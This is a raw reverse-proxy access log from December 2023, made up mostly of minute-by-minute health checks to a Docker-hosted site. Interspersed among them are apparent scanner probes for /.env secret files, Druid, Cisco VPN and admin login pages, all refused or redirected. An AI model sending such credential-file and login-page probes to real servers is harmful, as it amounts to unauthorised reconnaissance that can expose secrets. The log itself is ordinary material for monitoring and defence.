159.203.109.206 - - [17/Dec/2023:08:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 535 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 536 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 537 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [17/Dec/2023:08:23:32 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 538 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [17/Dec/2023:08:23:32 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 539 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:08:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 540 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 541 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 542 "www@docker" "http://172.18.0.9:80" 0ms
167.94.138.126 - - [17/Dec/2023:08:25:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 543 "-" "-" 0ms
167.94.138.126 - - [17/Dec/2023:08:25:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 544 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:08:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 545 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 546 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 547 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 548 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 549 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 550 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 551 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 552 "www@docker" "http://172.18.0.9:80" 1ms
194.44.90.53 - - [17/Dec/2023:08:29:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 553 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:08:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 554 "www@docker" "http://172.18.0.9:80" 0ms
205.210.31.165 - - [17/Dec/2023:08:29:34 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 555 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:08:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 556 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 557 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 558 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 559 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 560 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 561 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 562 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 563 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:08:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 564 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 565 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 566 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 567 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 568 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 569 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 570 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 571 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 572 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 573 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:08:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 574 "www@docker" "http://172.18.0.9:80" 1ms
104.131.144.31 - - [17/Dec/2023:08:38:45 +0000] "GET /druid/index.html HTTP/1.1" 301 17 "-" "-" 575 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:08:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 576 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 577 "www@docker" "http://172.18.0.9:80" 0ms
212.129.45.218 - - [17/Dec/2023:08:40:05 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 578 "-" "-" 0ms
212.129.45.218 - - [17/Dec/2023:08:40:07 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 579 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:08:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 580 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 581 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 582 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 583 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 584 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:08:42:33 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 585 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:08:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 586 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 587 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 588 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 589 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 590 "www@docker" "http://172.18.0.9:80" 0ms
143.198.143.69 - - [17/Dec/2023:08:45:06 +0000] "GET /script HTTP/1.1" 404 19 "-" "-" 591 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:08:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 592 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:08:45:31 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 593 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:08:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 594 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 595 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 596 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 597 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 598 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:08:48:20 +0000] "GET /manage/account/login HTTP/1.1" 404 19 "-" "-" 599 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:08:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 600 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 601 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 602 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 603 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 604 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 605 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 606 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 607 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 608 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:08:52:30 +0000] "GET /manage/account/login HTTP/1.1" 404 19 "-" "-" 609 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:08:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 610 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 611 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 612 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 613 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:08:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 614 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 615 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 616 "www@docker" "http://172.18.0.9:80" 1ms
52.56.195.196 - - [17/Dec/2023:08:55:51 +0000] "GET /admin/index.html HTTP/1.1" 404 19 "-" "-" 617 "-" "-" 0ms
95.214.235.169 - - [17/Dec/2023:08:55:54 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 618 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [17/Dec/2023:08:55:54 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 619 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:08:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 620 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 621 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 622 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:08:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 623 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:08:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 624 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:08:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 625 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:08:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 626 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:08:59:24 +0000] "GET /admin/index.html HTTP/1.1" 404 19 "-" "-" 627 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:08:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 628 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 629 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 630 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 631 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:09:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 632 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 633 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 634 "www@docker" "http://172.18.0.9:80" 1ms
52.56.195.196 - - [17/Dec/2023:09:02:40 +0000] "GET /index.html HTTP/1.1" 404 19 "-" "-" 635 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 636 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 637 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:09:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 638 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 639 "www@docker" "http://172.18.0.9:80" 0ms
201.19.200.15 - - [17/Dec/2023:09:05:18 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 640 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 641 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 642 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:09:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 643 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:09:06:37 +0000] "GET /index.html HTTP/1.1" 404 19 "-" "-" 644 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:09:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 645 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 646 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 647 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 648 "www@docker" "http://172.18.0.9:80" 0ms
198.235.24.26 - - [17/Dec/2023:09:08:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 649 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:09:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 650 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 651 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [17/Dec/2023:09:09:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 652 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:09:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 653 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:09:09:55 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 19 "-" "-" 654 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 655 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 656 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 657 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 658 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 659 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 660 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:09:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 661 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 662 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 663 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:09:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 664 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:09:14:44 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 19 "-" "-" 665 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 666 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 667 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 668 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:09:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 669 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 670 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 671 "www@docker" "http://172.18.0.9:80" 1ms
52.56.195.196 - - [17/Dec/2023:09:18:22 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 404 19 "-" "-" 672 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 673 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 674 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 675 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [17/Dec/2023:09:19:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 676 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:09:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 677 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 678 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 679 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [17/Dec/2023:09:20:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 680 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 681 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 682 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:09:22:12 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 404 19 "-" "-" 683 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 684 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 685 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:09:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 686 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 687 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 688 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 689 "www@docker" "http://172.18.0.9:80" 0ms
45.79.168.172 - - [17/Dec/2023:09:24:40 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 690 "-" "-" 0ms
172.104.11.34 - - [17/Dec/2023:09:24:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 691 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 692 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 693 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:09:25:47 +0000] "GET /logon.htm HTTP/1.1" 404 19 "-" "-" 694 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 695 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:09:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 696 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 697 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 698 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 699 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:09:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 700 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 701 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 702 "www@docker" "http://172.18.0.9:80" 1ms
52.56.195.196 - - [17/Dec/2023:09:29:49 +0000] "GET /logon.htm HTTP/1.1" 404 19 "-" "-" 703 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 704 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 705 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:09:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 706 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 707 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 708 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 709 "www@docker" "http://172.18.0.9:80" 1ms
52.56.195.196 - - [17/Dec/2023:09:33:17 +0000] "GET /login.jsp HTTP/1.1" 404 19 "-" "-" 710 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:09:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 711 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 712 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 713 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 714 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 715 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 716 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:09:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 717 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:09:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 718 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:09:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 719 "www@docker" "http://172.18.0.9:80" 0ms
52.56.195.196 - - [17/Dec/2023:09:37:34 +0000] "GET /login.jsp HTTP/1.1" 404 19 "-" "-" 720 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:09:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 721 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:09:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 722 "www@docker" "http://172.18.0.9:80" 0ms
